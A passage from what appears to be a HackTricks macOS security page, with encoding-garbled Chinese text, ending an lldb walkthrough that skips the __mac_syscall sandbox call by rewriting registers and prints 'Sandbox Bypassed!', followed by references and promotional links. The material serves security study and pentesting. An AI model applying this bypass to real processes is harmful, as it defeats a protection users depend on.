0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
-&gt;  0x187659900 &lt;+0&gt;:  mov    x16, #0x17d
0x187659904 &lt;+4&gt;:  svc    #0x80
0x187659908 &lt;+8&gt;:  b.lo   0x187659928               ; &lt;+40&gt;
0x18765990c &lt;+12&gt;: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
</code></pre>
<p>{% hint style="warning" %}
<strong>å³ä½¿ç»•è¿‡äº†æ²™ç›’ï¼ŒTCC</strong> ä»ä¼šè¯¢é—®ç”¨æˆ·æ˜¯å¦å…è®¸è¯¥è¿›ç¨‹è¯»å–æ¡Œé¢ä¸Šçš„æ–‡ä»¶
{% endhint %}</p>
<h2 id="å‚è€ƒæ–‡çŒ®"><a class="header" href="#å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</a></h2>
<ul>
<li><a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></li>
<li><a href="https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/">https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/</a></li>
<li><a href="https://www.youtube.com/watch?v=mG715HcDgO8">https://www.youtube.com/watch?v=mG715HcDgO8</a>
{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></li>
</ul>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨ Twitter ä¸Šå…³æ³¨</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox/macos-default-sandbox-debug.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox/macos-sandbox-debug-and-bypass/macos-office-sandbox-bypasses.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox/macos-default-sandbox-debug.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox/macos-sandbox-debug-and-bypass/macos-office-sandbox-bypasses.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../../../elasticlunr.min.js"></script>
        <script src="../../../../../mark.min.js"></script>
        <script src="../../../../../searcher.js"></script>

        <script src="../../../../../clipboard.min.js"></script>
        <script src="../../../../../highlight.js"></script>
        <script src="../../../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
